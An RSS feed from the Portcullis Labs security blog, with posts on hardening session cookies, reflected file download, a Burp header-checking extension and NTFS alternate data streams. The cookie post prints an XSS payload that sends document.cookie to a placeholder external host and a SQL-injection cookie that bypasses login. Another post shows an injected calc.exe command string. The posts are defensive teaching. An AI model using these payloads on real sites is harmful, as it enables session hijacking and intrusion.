@@ -1,0 +1,663 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Portcullis Labs &#187; web</title>
+	<atom:link href="https://labs.portcullis.co.uk/tag/web/feed/" rel="self" type="application/rss+xml" />
+	<link>https://labs.portcullis.co.uk</link>
+	<description>Research and Development</description>
+	<language>en-US</language>
+		<sy:updatePeriod>hourly</sy:updatePeriod>
+		<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>http://wordpress.org/?v=3.8.5</generator>
+	<item>
+		<title>Keep your cookies safe (part 2)</title>
+		<link>https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-2/</link>
+		<comments>https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-2/#comments</comments>
+		<pubDate>Thu, 15 Feb 2018 20:31:26 +0000</pubDate>
+		<dc:creator><![CDATA[DMG]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[phishing]]></category>
+		<category><![CDATA[SDL]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[web]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=3960</guid>
+		<description><![CDATA[<p>In the first blog post we talked about the dangers that your cookies are exposed. Now it is time to keep your cookies safe. Time to know what protection mechanisms there are, how to use them and why. How to read this post? The flowchart below will guide you to the process to check if [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-2/">Keep your cookies safe (part 2)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>In the <a title="first blog post" href="/blog/keep-your-cookies-safe-part-1/">first blog post</a> we talked about the dangers that your cookies are exposed. Now it is time to keep your cookies safe. Time to know what protection mechanisms there are, how to use them and why.<span id="more-3960"></span></p>
+<h2>How to read this post?</h2>
+<p>The flowchart below will guide you to the process to check if your cookies are well protected. Note that there are more factors and cases that could potentially compromise your cookies (as we talked in the part 1 of the blog post).</p>
+<p>Of course at the end of the post you will find the explanation to the flowchart. So if you do not understand anything, do not panic! Look for the question in the last part of the blog where it will be explained.</p>
+<div id="attachment_3964" style="width: 466px" class="wp-caption aligncenter"><a name="imageclose-3961"><div class="lb-album"><a href="#image-3961"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2014/02/cookies_flowchart-456x1024.png" alt="flowchart about securing cookies" class="size-large wp-image-3964  "><span></span></a></div>              
+<a href="#imageclose-3961" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-3961">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2014/02/cookies_flowchart.png" alt="image-3961">
+                   </div></a><p class="wp-caption-text">A flowchart about how to get your cookies better secured.</p></div>
+<h3>Is your session cookie different before and after login?</h3>
+<ul>
+<li>Correct answer: Yes, if your unique session ID cookie is different after and before login, your session is correctly protected against Session Fixation attacks</li>
+<li>Incorrect answer: No, your unique session ID cookie is the same, if an attacker managed to stole your cookie before login into the web application, then once you are authenticated the attacker could also access the application</li>
+</ul>
+<p>Recommendation: Session ID should be changed after and before user logs in.</p>
+<h3>Are you invalidating the session when the user logs out?</h3>
+<ul>
+<li>Correct answer: Yes, once the user has logged out, the session must be destroyed or invalidated</li>
+<li>Incorrect answer: No, if you do not destroy the session ID in server side, the session will continue being valid</li>
+</ul>
+<p>Recommendation: Session must be invalidated after the user logs out.</p>
+<h3>Does your cookie have the attribute &#8220;HttpOnly&#8221;?</h3>
+<ul>
+<li>Correct answer: Yes, your cookie is only accessible via http and not via JavaScript</li>
+<li>Incorrect answer: No, your cookie is also accessible via JavaScript , which in case of an attacker compromise your application with a Cross-site Scripting, it could access to your cookie</li>
+</ul>
+<p>Recommendation: Set the cookie as &#8220;HttpOnly&#8221;.</p>
+<h3>Does your cookie have the full domain attribute set?</h3>
+<ul>
+<li>Correct answer: Yes, your cookie is only being sent to the correct domain where it is needed</li>
+<li>Incorrect answer: No, your cookie can be sent to the multiple sub-domains you could have</li>
+</ul>
+<p>Recommendation: The full domain of the cookie must be specified.</p>
+<h3>Does your cookie have an adequate lifetime?</h3>
+<ul>
+<li>Correct answer: Yes</li>
+<li>Incorrect answer: No, Cookies with an excessive lifetime will not be deleted when the user closes their browser and would therefore be exposed should an attacker manage to compromise the user&#8217;s system</li>
+</ul>
+<p>Recommendation: Use cookies without a lifetime so that they are deleted once the user closes their browser or lower its lifetime to meet business requirements.</p>
+<h3>Do you have only one web application in the same domain?</h3>
+<p>What does this question mean? The following is an example of multiple web applications in the same domain:</p>
+<ul>
+<li>www.mydomain.com/app1</li>
+<li>www.mydomain.com/app2</li>
+<li>www.mydomain.com/app3</li>
+</ul>
+<p>There is not a correct answer to this question.</p>
+<p>If you only have one application running over the same domain, you should not need to care about this issue. However if you host multiple web applications, you need to set the attribute &#8220;path&#8221; of the cookie to ensure that the cookie is only being sent to the web application it belongs.</p>
+<h3>Are your cookies NOT storing sensitive information?</h3>
+<ul>
+<li>Correct answer: Yes, my cookies do not contains sensitive information</li>
+<li>Incorrect answer: No, there are some sensitive information in the cookies</li>
+</ul>
+<p>Recommendation: Ensure that sensitive information is not stored in the cookies.</p>
+<h3>Does your web application support HTTPS?</h3>
+<p>If the answer to this question is NO, you are sending all the data through a plain text protocol. An attacker able to intercept network traffic between a user&#8217;s session and the web server could capture the sensitive data being transmitted.</p>
+<p>If the answer is YES, there is some other question you need to answer before know if you are protecting correctly your cookies:</p>
+<h3>Does your web application use HTTP + HTTPS (mixed content)?</h3>
+<p>If the answer is NO, it means that HTTP is not allowed and all the data is being sent over HTTPS. Although your cookie is secure in this case, you need to be careful if you enable HTTP.</p>
+<p>If the answer is YES you need to answer one more question:</p>
+<h3>Is HSTS (HTTP Strict Transport Security) enabled or has the cookie the attribute &#8220;secure&#8221;?</h3>
+<p>If you have HSTS enabled, you are forcing all the data being sent over HTTPS (cookies included).</p>
+<p>If the cookie has the attribute &#8220;secure&#8221;, you are forcing the cookie to be sent <strong>only</strong> over HTTPS.</p>
+<p>Recommendation: Set the cookie as &#8220;secure&#8221; and consider to enable HSTS.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-2/">Keep your cookies safe (part 2)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-2/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Web Application Whitepaper</title>
+		<link>https://labs.portcullis.co.uk/whitepapers/web-application-whitepaper/</link>
+		<comments>https://labs.portcullis.co.uk/whitepapers/web-application-whitepaper/#comments</comments>
+		<pubDate>Wed, 06 Sep 2017 11:12:46 +0000</pubDate>
+		<dc:creator><![CDATA[TMB]]></dc:creator>
+				<category><![CDATA[Whitepapers]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[HTML5]]></category>
+		<category><![CDATA[SDL]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[web]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6078</guid>
+		<description><![CDATA[<p>This document aims to analyse and explore data collected from technical assurance engagements during 2016. The original piece of data analysis was performed by two of our interns (Daniel and Chris) as part of Cisco&#8217;s intended contribution to the next Top 10 publication from OWASP however due to time constraints, our data points were not [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/whitepapers/web-application-whitepaper/">Web Application Whitepaper</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>This document aims to analyse and explore data collected from technical assurance engagements during 2016.<span id="more-6078"></span></p>
+<p>The original piece of data analysis was performed by two of our interns (Daniel and Chris) as part of Cisco&#8217;s intended contribution to the next Top 10 publication from OWASP however due to time constraints, our data points were not submitted. As a result, the co-authors (Simone and Isa) chose to compare the EMEAR team&#8217;s statistics from 2016 against the now public 2017 Top 10 published by OWASP. Additionally, they also took a look at the most common web application issues reported by the Team during the last year and analysed their impact and severity.</p>
+<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-1').click();">
+  <div class="icon"><a href="https://labs.portcullis.co.uk/download/WAW.pdf" target="_blank" title="Download WAW"><img align="middle" src="https://labs.portcullis.co.uk/wp-includes/images/crystal/document.png" alt="WAW" /></a></div>
+  <div class="filetitle">
+    <a href="https://labs.portcullis.co.uk/download/WAW.pdf" title="Download WAW.pdf" target="_blank" id="wpfb-file-link-1">WAW.pdf</a>
+    
+    <br />
+    September 6, 2017<br />
+    Version: 1.0<br />
+  </div>
+  <div class="info">
+    925.6 KiB<br />
+    MD5 hash: 0986d3ab7f6f55c71199296189ce5f62 <br />
+    <a href="#" onclick="return wpfilebase_filedetails(1);">Details</a>
+  </div>
+  <div class="details" id="wpfilebase-filedetails1" style="display: none;">
+  
+  <table border="0">
+   
+   
+   
+   
+   
+   
+   <tr><td><strong>Date:</strong></td><td>September 6, 2017</td></tr>
+  </table>
+  </div>
+ <div style="clear: both;"></div>
+</div>
+<p>The post <a href="https://labs.portcullis.co.uk/whitepapers/web-application-whitepaper/">Web Application Whitepaper</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/whitepapers/web-application-whitepaper/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Keep your cookies safe (part 1)</title>
+		<link>https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-1/</link>
+		<comments>https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-1/#comments</comments>
+		<pubDate>Fri, 22 Apr 2016 15:03:32 +0000</pubDate>
+		<dc:creator><![CDATA[DMG]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[phishing]]></category>
+		<category><![CDATA[SDL]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[web]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=3605</guid>
+		<description><![CDATA[<p>What are cookies and why are they important? A cookie is a small piece of data sent from a web site and stored in a user&#8217;s web browser and is subsequently includes with all authenticated requests that belong to that session. Some cookies contain the user session data in a web site, which is vital. [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-1/">Keep your cookies safe (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>What are cookies and why are they important?<span id="more-3605"></span></p>
+<p>A cookie is a small piece of data sent from a web site and stored in a user&#8217;s web browser and is subsequently includes with all authenticated requests that belong to that session. Some cookies contain the user session data in a web site, which is vital. Others cookies are used for tracking long-term records of an individuals browsing history and preferences such as their preferred language. Sometimes they are also used for tracking and monitoring a user&#8217;s activities across different web sites.</p>
+<p>Due to the fact that HTTP is a stateless protocol, the web site needs a way to authenticate the user in each request. Every time the user visits a new page within a web site, the browser sends the users cookie back to the server, allowing the server to serve the correct data to that individual user, which is tracked using a session ID. Cookies therefore play an integral part in ensuring persistence of data used across multiple HTTP requests throughout the time a user visits a web site.</p>
+<p>What does a cookie look like?</p>
+<pre class="brush: php; gutter: false; title: ; notranslate">
+Set-Cookie: __cfduid=d8a3ae94f81234321; expires=Mon, 23-Dec-2019 23:50:00 GMT; path=/; domain=.domain.com; HttpOnly
+</pre>
+<p>The cookie below is an example of a common cookie generated for WordPress. Here we break down each part of the cookie and explain what it is used for:</p>
+<ul>
+<li>Set-Cookie &#8211; the web server asks the browser to save the cookie with this command</li>
+<li>__cfduid=d8a3ae94f81234321;: This is the cookie itself. At the left of the equals symbol is the name of the cookie and to the right is its value</li>
+<li>expires=Mon, 23-Dec-2019 23:50:00 GMT; &#8211; this is the date and time when the cookie will expire</li>
+<li>path=/; domain=.domain.com; &#8211; the cookie domain and path define the scope of the cookie. They tell the browser that cookies should only be sent back to the server for the given domain and path</li>
+<li>HttpOnly &#8211; this attribute (without a value associated) tells the browser that JavaScript cannot be used to access the cookie, which must only be accessed through HTTP or HTTPS. Sometimes you will also see the attribute &#8220;Secure&#8221;, which prevents the cookie being sent over the unencrypted HTTP protocol (i.e. the cookie will only be transmitted over HTTPS)</li>
+</ul>
+<p>What is the impact of having your cookies compromised?</p>
+<p>A traditional and important role of a cookie is to store a users session ID, which is used to identify a user. If this type of cookie is stolen by a malicious user, they would be able to gain access to web site as the user for which the cookie belonged to (i.e. the malicoius user would have access to your account within the web site).</p>
+<p>In the case of the tracking cookie, the malicious user would have access to your browsing history for the web site.</p>
+<p>Another problem arises when sensitive data is stored in cookies, for example a username, and this is also a vector for server side exploitation if its contents are not properly validated, which can potentially lead to serious vulnerabilties such as SQL Injection or remote code execution.</p>
+<p>What are the main cookie threats?</p>
+<div id="attachment_3785" style="width: 310px" class="wp-caption aligncenter"><a href="http://www.flickr.com/photos/somegeekintn/" target="_blank"><img class="size-medium wp-image-3785  " title="Cookie Monster" alt="cookie monster image" src="https://labs.portcullis.co.uk/wp-content/uploads/2014/02/cookie_monster-300x198.jpg" width="300" height="198" /></a><p class="wp-caption-text">Cookie Monster.</p></div>
+<p>There are different attacking vectors in which obtaining and modifying cookies can occur, leading to session hijacking of an authenticated user session, or even SQL injection attacks against the server. These threats may take place when an attacker takes control of the web browser using Cross-site Scripting, or Spyware, in order to obtain a users SessionID cookie that can then be used by an attacker to impersonate the legitimate user, as shown in the following example:</p>
+<p>Obtaining access to the cookie can be as easy as using the following JavaScript line:</p>
+<pre class="brush: jscript; gutter: false; title: ; notranslate">
+document.cookie
+</pre>
+<p>Imagine that the web site has a search form that is vulnerable to Cross-site Scripting (Reflective Cross-site Scripting in this case). </p>
+<pre class="brush: plain; gutter: false; title: ; notranslate">
+
+http://myweb.com/form.php?search=XSS_PAYLOAD_HERE
+
+</pre>
+<p>An attacker could use the following payload to send the cookie to an external web site:</p>
+<pre class="brush: xml; gutter: false; title: ; notranslate">
+&amp;lt;script&amp;gt;location.href='http://external_web site.com/cookiemonster.php?c00kie='+escape(document.cookie);&amp;lt;/script&amp;gt;
+</pre>
+<p>The final step would be to send the vulnerable link to an admin and wait for them to click on it. If the attacker uses an URL shortener, this allows for further obfuscation of the malicous URL, as the admin will be unable to see the content of the link they have been sent.</p>
+<p>An attacker able to read files from a given user may also attempt to retrieve the cookies stored in files from a system. Furthermore some browsers store  persistent cookies in a binary file that is easily readable with existing <a title="public tools" href="http://securitylearn.net/wp-content/uploads/tools/iOS/BinaryCookieReader.py">public tools</a>.</p>
+<p>Security weaknesses may also reside server side when cookies are modified, if input validation routines are not adequately implemented. The example below shows how to bypass the authentication process:</p>
+<pre class="brush: php; gutter: false; title: ; notranslate">
+//In /core/user.php: (cs cart vulnerability)
+
+if (fn_get_cookie(AREA_NAME . '_user_id')) {
+ $udata = db_get_row(&quot;SELECT user_id, user_type, tax_exempt, last_login, membership_status, membership_id FROM $db_tables[users]
+ WHERE user_id='&quot;.fn_get_cookies(AREA_NAME . '_user_id').&quot;' AND password='&quot;.fn_get_cookie(AREA_NAME . '_password').&quot;'&quot;);
+ fn_define('LOGGED_VIA_COOKIE', true);
+
+}
+
+//Cookie: cs_cookies[customer_user_id]=1'/*;
+</pre>
+<p>For their role, cookies are really important and may be used in different attacks.</p>
+<p>Now that you are more aware of the dangers, it would be wise to ensure steps are taken to deploy web site cookies safely and securely. Look out for the second part of this post!</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-1/">Keep your cookies safe (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-1/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Burp Extension</title>
+		<link>https://labs.portcullis.co.uk/blog/burp-extension/</link>
+		<comments>https://labs.portcullis.co.uk/blog/burp-extension/#comments</comments>
+		<pubDate>Wed, 26 Aug 2015 12:09:36 +0000</pubDate>
+		<dc:creator><![CDATA[OMC]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[web]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5225</guid>
+		<description><![CDATA[<p>At Portcullis, one of the more frequent assessments we perform are web application assessments. One of the main challenges we face during these assessments is to look for information that can either help escalate our privileges or allow us to gain access to different functionalities of the web application. Unauthorised access to functionality can often [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/burp-extension/">Burp Extension</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>At Portcullis, one of the more frequent assessments we perform are web application assessments. One of the main challenges we face during these assessments is to look for information that can either help escalate our privileges or allow us to gain access to different functionalities of the web application. Unauthorised access to functionality can often be considered an issue however, testing for this can also lead to information about the type of web server an application is running on, the underlying host and its version.<span id="more-5225"></span></p>
+<p>To check whether an application is out-of-date or is there are any known vulnerabilities associated with said version we must first obtain the server and version information. This can often prove time consuming and can be subject to human error. To improve effectiveness and reduce occurrence of human error we developed a <a href="https://portswigger.net/burp/">BurpSuite</a> extension that checks whether the server discloses any information within the response headers and automatically adds the issue to an issues list.</p>
+<p>In addition to checking for disclosed information, the extension with also make a request to the web server’s main page for the latest version and compare this to the application in question to confirm that the application in question is the most up to date available. The most common web servers, and some others, are already bundled with the extension. However, the extension also provides a configuration tab in which the headers that are checked for information disclosure can be modified, removed or added. This also applies to the software, URLs and REGEX used to access the latest versions.</p>
+<p style="text-align: left;"><a name="imageclose-5226"><div class="lb-album"><a href="#image-5226"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2015/08/BURPEXTENSION-300x254.png" alt="BURPEXTENSION" class="size-medium wp-image-5231 aligncenter"><span></span></a></div>              
+<a href="#imageclose-5226" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-5226">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2015/08/BURPEXTENSION.png" alt="image-5226">
+                   </div></a></p>
+<p>In the above image, you will see that there are two other pieces of functionality bundled with the extension. The first, following the same line of enquiry as the previous (checking the server’s response headers), the extension is also able to check for missing security headers. As before, whilst most of the security headers are already bundled with the extension, it is possible to add more/alternative headers to be check for. Additionally, there is an option to add an informational issue if any of the security headers are found.</p>
+<p>The second functionality is a default burp state restorer. Following good practice, a new assessment would start with a clean burp state. To improve efficiency, instead of repeatedly loading the same path state, you can use the extension to load a state file from any chosen path. This will save you at least 4 clicks and you won’t forget to configure anything when starting burp.</p>
+<p>Finally, the last piece of functionality provided by the extension is a new tab on the request and response editor window that parses a JSON object and prints it with indentation, making it easier to read. This will prove useful when dealing with web services or AJAX requests with JSON responses.</p>
+<p>It should be noted that when reporting the information disclosure and the missing headers issues, only one issue is reported per host. In cases where different finding appear in later responses, further issues will be added with the new findings.</p>
+<p>The source code of the application can be found at : <a href="https://github.com/eonlight/BurpExtenderHeaderChecks">https://github.com/eonlight/BurpExtenderHeaderChecks</a></p>
+<p><em>This blog post was written by Ruben</em></p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/burp-extension/">Burp Extension</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/burp-extension/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>You can&#8217;t even trust your own reflection these days&#8230;</title>
+		<link>https://labs.portcullis.co.uk/blog/you-cant-even-trust-your-own-reflection-these-days/</link>
+		<comments>https://labs.portcullis.co.uk/blog/you-cant-even-trust-your-own-reflection-these-days/#comments</comments>
+		<pubDate>Wed, 05 Nov 2014 17:37:34 +0000</pubDate>
+		<dc:creator><![CDATA[TMB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[HTML5]]></category>
+		<category><![CDATA[phishing]]></category>
+		<category><![CDATA[web]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=4794</guid>
+		<description><![CDATA[<p>Recently, researchers at Trustwave&#8217;s SpiderLabs spoke at Black Hat Europe on the dangers of simply reflecting data back to the requesting user as part of an HTTP request/response exchange. When you think about it, this stands to reason, after all, it&#8217;s what Cross-site Scripting attacks are born from. What&#8217;s interesting is that the new research [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/you-cant-even-trust-your-own-reflection-these-days/">You can&#8217;t even trust your own reflection these days&#8230;</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Recently, researchers at Trustwave&#8217;s SpiderLabs spoke at Black Hat Europe on the dangers of simply reflecting data back to the requesting user as part of an HTTP request/response exchange. When you think about it, this stands to reason, after all, it&#8217;s what Cross-site Scripting attacks are born from. What&#8217;s interesting is that the new research discussed another way in which it could be exploited.<span id="more-4794"></span></p>
+<p>The basic premise of the attack (as described on SpiderLabs&#8217;s <a title="Reflected File Download whitepaper" href="http://blog.spiderlabs.com/2014/10/reflected-file-download-the-white-paper.html">Reflected File Download whitepaper</a>) is as follows:</p>
+<ol>
+<li>The user follows a malicious link to a trusted web site</li>
+<li>An executable file is downloaded and saved on the user’s machine. All security indicators show that the file was hosted on the trusted web site</li>
+<li>The user executes the file which contains shell commands that gain complete control over the computer</li>
+</ol>
+<p>So how does it work? On a recent engagement, <a title="AMM" href="https://labs.portcullis.co.uk/author/amm/">one of our consultants</a> found a similar issue. In their case, it was a stored variant of the issue SpiderLabs describe but in other regards, it was identical. The consultant discovered that the application they were testing used two APIs that allowed for the storage and retrieval of data, like so:</p>
+<pre class="brush: plain; gutter: false; title: ; notranslate">
+POST /putData HTTP/1.0
+...
+{&quot;id&quot;:12345, &quot;input&quot;:&quot;asdf||calc.exe||pause&quot;}
+</pre>
+<p>This data could then be retrieved using the following URL:</p>
+<ul>
+<li>http://URL/getData/12345;1.bat</li>
+</ul>
+<p>Requesting this in a browser results in the browser believing that the user has downloaded what appeared to be a batch file called 12345;1.bat. If the user executes this file, then calc.exe (part of our original input) will be executed.</p>
+<p>As with other similar attacks, which exploit variances in how user controlled data is treated by different components of a solution (in this case, the browser and the server), once you know what to watch out for, it&#8217;s fairly easy to mitigate.</p>
+<p>Specifically:</p>
+<ul>
+<li>Validate all user input</li>
+<li>Sanitise by means of context sensitive encoding/escaping any user input that remains</li>
+<li>Avoid wildcard mappings such as /getdata/* on exposed web services</li>
+<li>Ensure that you&#8217;re correctly setting the important HTTP headers such as Content-Type and Content-Disposition (and other related headers such as X-Content-Type-Options) so that direct requests for the URL cause the file to be downloaded</li>
+</ul>
+<p>This last point is particularly important, browsers will often attempt to automatically render downloaded content using whatever application is rendered for the target file type. Sending a Content-Disposition header of:</p>
+<pre class="brush: plain; gutter: false; title: ; notranslate">
+attachment; filename=1.txt
+</pre>
+<p>precludes this, as no matter whether it is saved or opened, it will be treated as text, a <a title="relatively safe" href="http://comments.gmane.org/gmane.comp.security.oss.general/14512">relatively safe</a> file type.</p>
+<p>All in all, a nice catch and one we&#8217;ll definitely use in our red team engagements.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/you-cant-even-trust-your-own-reflection-these-days/">You can&#8217;t even trust your own reflection these days&#8230;</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/you-cant-even-trust-your-own-reflection-these-days/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>EMF Camp 2014 talk</title>
+		<link>https://labs.portcullis.co.uk/blog/emf-camp-2014-talk/</link>
+		<comments>https://labs.portcullis.co.uk/blog/emf-camp-2014-talk/#comments</comments>
+		<pubDate>Thu, 28 Aug 2014 17:15:14 +0000</pubDate>
+		<dc:creator><![CDATA[OMC]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[conference]]></category>
+		<category><![CDATA[emfcamp2014]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[SDL]]></category>
+		<category><![CDATA[web]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=4646</guid>
+		<description><![CDATA[<p>We recently announced our sponsorship of EMF Camp 2014, were ready to go Portcullis flags in tow and will be heading on over to Milton Keynes to help get EMF ready. While there we will not only be sponsoring the Lounge where people can come and enjoy a space to relax and drink beer and [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/emf-camp-2014-talk/">EMF Camp 2014 talk</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>We recently announced our sponsorship of EMF Camp 2014, were ready to go Portcullis flags in tow and will be heading on over to Milton Keynes to help get EMF ready.</p>
+<p>While there we will not only be sponsoring the Lounge where people can come and enjoy a space to relax and drink beer and setting up Portcullis Village where people can visit us and exchange ideas but we will be having members of Portcullis hosting talks throughout the weekend.<span id="more-4646"></span></p>
+<h2>How Many Bugs Can A Time Server Have? Friday 29th @ 14:00PM Stage B</h2>
+<p>Portcullis members Tim Brown and Mike Emery will be talking about a number of new advisories to be released by Portcullis during the event including remote root in a network device. The attack surface area will be broken down, with the bugs in each area exposed. The impact of the finding as a whole will then be discussed, with the consequences potentially reaching far beyond the compromised device itself!</p>
+<h2>Minimal Effort Web Application Security (a.k.a. how to make my job harder) Sunday 31st @ 12:00 Stage C</h2>
+<p>Portcullis member Graham Sutherland will be presenting his quick tips on making your web applications more resistant to common attack vectors, without putting a lot of effort in. Graham says &#8220;In some cases, simply adding a like to a configuration file can completely prevent entire classes of attack from being viable&#8221;. Graham will take a look at hardening against XSS, SQL injection, click jacking, password cracking, and a few other bits if there’s time. &#8220;With any luck, you’ll make my job a lot harder!&#8221;</p>
+<p>For those spoilt for choice both talks will be featured in our EMF blog to be posted after the event.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/emf-camp-2014-talk/">EMF Camp 2014 talk</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/emf-camp-2014-talk/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>NTFS Alternate Data Streams for pentesters (part 1)</title>
+		<link>https://labs.portcullis.co.uk/blog/ntfs-alternate-data-streams-for-pentesters-part-1/</link>
+		<comments>https://labs.portcullis.co.uk/blog/ntfs-alternate-data-streams-for-pentesters-part-1/#comments</comments>
+		<pubDate>Thu, 27 Feb 2014 11:23:17 +0000</pubDate>
+		<dc:creator><![CDATA[AMM]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[ADS]]></category>
+		<category><![CDATA[NTFS]]></category>
+		<category><![CDATA[web]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=3677</guid>
+		<description><![CDATA[<p>Alternate Data Streams (ADS) have been present in modern versions of Windows for a long time. If you are using a NTFS filesystem, you can bet that you are using them. As penetration testers, we can use that OS-specific feature in our advantage. In the following posts information required to understand and identify potential ADS-related issues [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/ntfs-alternate-data-streams-for-pentesters-part-1/">NTFS Alternate Data Streams for pentesters (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Alternate Data Streams (ADS) have been present in modern versions of Windows for a long time. If you are using a NTFS filesystem, you can bet that you are using them. As penetration testers, we can use that OS-specific feature in our advantage. In the following posts information required to understand and identify potential ADS-related issues will be provided. This post will provide the required background to understand some common scenarios that could be useful during the penetration testing engagements.<span id="more-3677"></span></p>
+<h2>What are Alternate Data Streams?</h2>
+<p>Alternate Data Streams is a feature supported by NTFS (New Technology File System) Windows-proprietary filesystem. With NTFS, all files contain at least one stream, but it is possible to associate alternate streams or contents to that file. When you open a file, you are accessing the main stream of the file, but using a specific syntax, you can access an alternate stream. ADS are also known as NTFS streams.</p>
+<p>If it helps you to understand this concept, try to think of the NTFS file as a container with multiple compartments. The container will be the file name, and each of the compartments will be a stream. Unless stated otherwise, when accessing the container, you&#8217;ll open the default compartment which is the standard behavior when you open a file on Windows.</p>
+<h2>Why should I care about ADS?</h2>
+<p>As penetration testers, using ADS could allow us to bypass the expected behavior of the applications. Take in account that NTFS streams are fully integrated by Windows, which also imply that most of the web components build on top of it supports it (e.g. PHP/Java), even if the developers are not aware of that.</p>
+<p>Therefore, using the ADS format could help us during our penetration testing activities, as the input validation controls might not be expecting a filename using the NTFS stream format.</p>
